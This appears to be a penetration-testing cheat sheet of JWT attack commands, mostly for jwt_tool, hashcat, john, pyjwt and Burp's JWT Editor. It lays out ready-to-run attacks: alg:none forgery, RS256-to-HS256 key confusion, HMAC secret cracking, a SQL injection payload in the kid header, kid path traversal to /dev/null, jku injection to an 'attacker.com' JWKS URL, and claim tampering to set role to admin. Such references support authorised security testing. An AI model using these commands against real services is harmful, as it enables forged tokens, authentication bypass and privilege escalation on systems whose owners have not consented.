# JWT Tools Reference

## jwt_tool (Primary CLI — covers almost everything)

### Install
```bash
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool && pip3 install -r requirements.txt --break-system-packages
```

### Decode a token
```bash
python3 jwt_tool.py YOUR.JWT.TOKEN
```

### Run all checks automatically (tamper + scan)
```bash
python3 jwt_tool.py TOKEN -t https://target.com/api/profile -rh "Authorization: Bearer JWT" -M at
# -M at  = run all known attacks
```

### alg:none
```bash
python3 jwt_tool.py TOKEN -X a
# Tries all none variants (none, None, NONE, nOnE…)
```

### RS256 → HS256 confusion
```bash
python3 jwt_tool.py TOKEN -X k -pk public.pem
```

### Brute-force HMAC secret
```bash
python3 jwt_tool.py TOKEN -C -d /path/to/wordlist.txt
```

### kid SQLi
```bash
python3 jwt_tool.py TOKEN -I -hc kid -hv "' UNION SELECT 'attackersecret'--" \
  -S hs256 -p "attackersecret"
```

### kid path traversal → /dev/null (empty secret)
```bash
python3 jwt_tool.py TOKEN -I -hc kid -hv "../../../../../../dev/null" \
  -S hs256 -p ""
```

### jku injection
```bash
python3 jwt_tool.py TOKEN -X s -ju "https://attacker.com/jwks.json"
```

### jwk injection (self-signed)
```bash
python3 jwt_tool.py TOKEN -X i
```

### Tamper a claim
```bash
python3 jwt_tool.py TOKEN -I -pc role -pv admin
# -I = inject/tamper, -pc = payload claim, -pv = value
# -hc = header claim, -hv = value
```

### Tamper + re-sign with known secret
```bash
python3 jwt_tool.py TOKEN -I -pc role -pv admin -S hs256 -p "foundsecret"
```

---

## hashcat — HMAC Secret Brute-Force (GPU)

```bash
# Save just the token to a file
echo "eyJ...TOKEN...xyz" > jwt.txt

# HS256
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# With rules
hashcat -a 0 -m 16500 jwt.txt wordlist.txt -r rules/best64.rule

# HS384
hashcat -a 0 -m 16511 jwt.txt wordlist.txt

# HS512
hashcat -a 0 -m 16512 jwt.txt wordlist.txt

# Show result when cracked
hashcat -m 16500 jwt.txt wordlist.txt --show
```

---

## john — HMAC Secret Brute-Force (CPU)

```bash
john --format=HMAC-SHA256 --wordlist=wordlist.txt jwt.txt
john --format=HMAC-SHA256 jwt.txt --show   # show cracked
```

---

## pyjwt — Python Crafting

```bash
pip3 install pyjwt cryptography --break-system-packages
```

```python
import jwt

# Encode (sign)
token = jwt.encode({"sub": "1", "role": "admin"}, "secret", algorithm="HS256")

# Decode without verification (read-only)
data = jwt.decode(token, options={"verify_signature": False})

# Decode with verification
data = jwt.decode(token, "secret", algorithms=["HS256"])
```

---

## Burp Suite — JWT Editor Extension

Install from BApp Store: **JWT Editor**

Features:
- Decode any JWT in Burp's request editor
- One-click alg:none attack
- Generate RSA/EC/symmetric keys
- Embedded JWKS server (for jku injection)
- Sign modified tokens with any key
- Auto-detect JWT in requests

Workflow:
1. Intercept request with JWT in Burp Proxy
2. Go to the **JWT Editor** tab in the request
3. Modify header/payload fields directly
4. Use Attack menu for automated attacks
5. Forward the modified request

---

## Online Tools

- **jwt.io** — decode and inspect any JWT visually
- **CrackStation** — paste HS256 JWT hash for online brute-force
- **Burp Collaborator** — host JWKS server for jku/x5u attacks
- **webhook.site** — alternative for hosting JWKS files

---

## Proxy Setup (for testing with curl)

```bash
# Route curl through Burp to capture/replay
curl -x http://127.0.0.1:8080 -k https://target.com/api/profile \
  -H "Authorization: Bearer TOKEN"
```
